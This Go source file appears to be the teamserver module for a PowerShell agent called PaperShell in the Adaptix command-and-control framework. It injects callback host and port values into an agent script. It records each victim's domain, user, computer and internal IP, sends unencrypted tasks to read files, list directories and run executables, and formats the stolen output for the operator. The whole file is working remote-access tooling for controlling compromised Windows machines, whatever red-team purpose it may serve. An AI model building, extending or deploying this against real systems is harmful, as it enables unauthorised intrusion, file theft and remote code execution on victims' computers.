package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"

	adaptix "github.com/Adaptix-Framework/axc2"
)

func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
	return nil, nil
}

func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
	var (
		Filename     string
		buildContent []byte
	)

	// Получаем нужные параметры подключения
	callbackHost, callbackPort, _ := net.SplitHostPort(strings.TrimSpace(listenerMap["callback_address"].(string)))

	// Собираем агента
	currentDir := ModuleDir
	Filename = "agent.ps1"

	agentContentBytes, err := os.ReadFile(currentDir + "/src_papershell/agent.ps1")
	if err != nil {
		return nil, "", err
	}

	agentContent := string(agentContentBytes)

	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_HOST>", callbackHost)
	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_PORT>", callbackPort)
	agentContent = strings.ReplaceAll(agentContent, "<WATERMARK>", AgentWatermark)

	buildContent = []byte(agentContent)

	return buildContent, Filename, nil
}

type InitialData struct {
	Domain     string `json:"domain"`
	Username   string `json:"username"`
	Computer   string `json:"computer"`
	InternalIP string `json:"internal_ip"`
}

func CreateAgent(initialData []byte) (adaptix.AgentData, error) {
	var agentData adaptix.AgentData

	fmt.Printf("res: %v\n", initialData)

	var parsedData InitialData
	err := json.Unmarshal(initialData, &parsedData)
	if err != nil {
		return agentData, err
	}

	// Fill data: domain, computer, username, internalip
	agentData.Domain = parsedData.Domain
	agentData.Username = parsedData.Username
	agentData.Computer = parsedData.Computer
	agentData.InternalIP = parsedData.InternalIP
	agentData.Os = OS_WINDOWS

	// Мы не шифруем данные
	agentData.SessionKey = []byte("NULL")

	return agentData, nil
}

func AgentEncryptData(data []byte, key []byte) ([]byte, error) {
	return data, nil
}

func AgentDecryptData(data []byte, key []byte) ([]byte, error) {
	return data, nil
}

/// TASKS

type AgentTaskData struct {
	TaskId   string `json:"task_id"`
	TaskData []byte `json:"task_data"`
}

func PackTasks(agentData adaptix.AgentData, tasksArray []adaptix.TaskData) ([]byte, error) {
	var tasks []AgentTaskData

	for _, task := range tasksArray {
		tasks = append(tasks, AgentTaskData{
			TaskId:   task.TaskId,
			TaskData: task.Data,
		})
	}

	packData, err := json.Marshal(tasks)

	if err != nil {
		return nil, err
	}

	return packData, nil
}

func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
	return nil, errors.New("PaperShell agent does not support pivot yet")
}

func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	// subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	commandData := make(map[string]any)

	commandData["command"] = command

	switch command {
	case "cat":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("paramter 'path' must be set")
			goto RET
		}
		commandData["path"] = path
	case "cd":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		commandData["path"] = path
	case "ls":
		// path is optional for ls, use current directory if not provided
		if path, ok := args["path"].(string); ok {
			commandData["path"] = path
		}

	case "run":
		executable, ok := args["executable"].(string)
		if !ok {
			err = errors.New("parameter 'executable' must be set")
			goto RET
		}
		commandData["executable"] = executable

		if cmdArgs, ok := args["args"].(string); ok {
			commandData["args"] = cmdArgs
		}
	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, err = json.Marshal(commandData)
	if err != nil {
		goto RET
	}

RET:
	return taskData, messageData, err
}

type ResultData struct {
	Path    string `json:"path"`
	Command string `json:"command"`
	TaskId  string `json:"taskId"`

	// cat
	Content []byte `json:"content,omitempty"`

	// cd
	NewPath string `json:"new_path,omitempty"`

	// ls
	Files []FileInfo `json:"files,omitempty"`

	// run
	Executable string `json:"executable,omitempty"`
	Args       string `json:"args,omitempty"`
	Stdout     string `json:"stdout,omitempty"`
	Stderr     string `json:"stderr,omitempty"`
	ExitCode   int    `json:"exitCode,omitempty"`
}

type FileInfo struct {
	Name          string `json:"Name"`
	FullName      string `json:"FullName"`
	IsDirectory   bool   `json:"IsDirectory"`
	Length        *int64 `json:"Length,omitempty"`
	LastWriteTime string `json:"LastWriteTime"`
}

func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData adaptix.TaskData, packedData []byte) []adaptix.TaskData {
	var outTasks []adaptix.TaskData
	var resultData []ResultData

	err := json.Unmarshal(packedData, &resultData)
	if err != nil {
		return outTasks
	}

	for _, taskResult := range resultData {
		command := taskResult.Command

		switch command {
		case "cat":
			path := taskResult.Path
			fileContent := taskResult.Content
			task := taskData
			task.TaskId = taskResult.TaskId
			task.Message = fmt.Sprintf("'%v' file content:", path)
			task.ClearText = string(fileContent)
			outTasks = append(outTasks, task)
		case "cd":
			path := taskResult.Path
			newPath := taskResult.NewPath
			task := taskData
			task.TaskId = taskResult.TaskId
			task.Message = fmt.Sprintf("Changed directory to: %s", newPath)
			task.ClearText = fmt.Sprintf("Previous path: %s\nCurrent path: %s", path, newPath)
			outTasks = append(outTasks, task)

		case "ls":
			path := taskResult.Path
			files := taskResult.Files
			task := taskData
			task.TaskId = taskResult.TaskId
			task.Message = fmt.Sprintf("Directory listing for: %s", path)

			var output strings.Builder
			output.WriteString(fmt.Sprintf("Contents of: %s\n\n", path))

			for _, file := range files {
				if file.IsDirectory {
					output.WriteString(fmt.Sprintf("[DIR]  %s\n", file.Name))
				} else {
					size := "0"
					if file.Length != nil {
						size = fmt.Sprintf("%d", *file.Length)
					}
					output.WriteString(fmt.Sprintf("[FILE] %s (%s bytes)\n", file.Name, size))
				}
			}

			task.ClearText = output.String()
			outTasks = append(outTasks, task)
		case "run":
			executable := taskResult.Executable
			args := taskResult.Args
			stdout := taskResult.Stdout
			stderr := taskResult.Stderr
			exitCode := taskResult.ExitCode

			task := taskData
			task.TaskId = taskResult.TaskId
			task.Message = fmt.Sprintf("Command executed: %s", executable)

			var output strings.Builder
			output.WriteString(fmt.Sprintf("Executable: %s\n", executable))
			if len(args) > 0 {
				output.WriteString(fmt.Sprintf("Arguments: %v\n", args))
			}
			output.WriteString(fmt.Sprintf("Exit Code: %d\n\n", exitCode))

			if stdout != "" {
				output.WriteString(fmt.Sprintf("STDOUT:\n%s\n", stdout))
			}
			if stderr != "" {
				output.WriteString(fmt.Sprintf("STDERR:\n%s\n", stderr))
			}

			task.ClearText = output.String()
			outTasks = append(outTasks, task)
		default:
			continue
		}
	}

	return outTasks
}

/// TUNNELS

func TunnelCreateTCP(channelId int, address string, port int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelCreateUDP(channelId int, address string, port int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelWriteTCP(channelId int, data []byte) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelWriteUDP(channelId int, data []byte) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelClose(channelId int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelReverse(tunnelId int, port int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

/// TERMINAL

func TerminalStart(terminalId int, program string, sizeH int, sizeW int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Remote Terminal not supported")
	/// END CODE HERE
}

func TerminalWrite(terminalId int, data []byte) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Remote Terminal not supported")
	/// END CODE HERE
}

func TerminalClose(terminalId int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Remote Terminal not supported")
	/// END CODE HERE
}
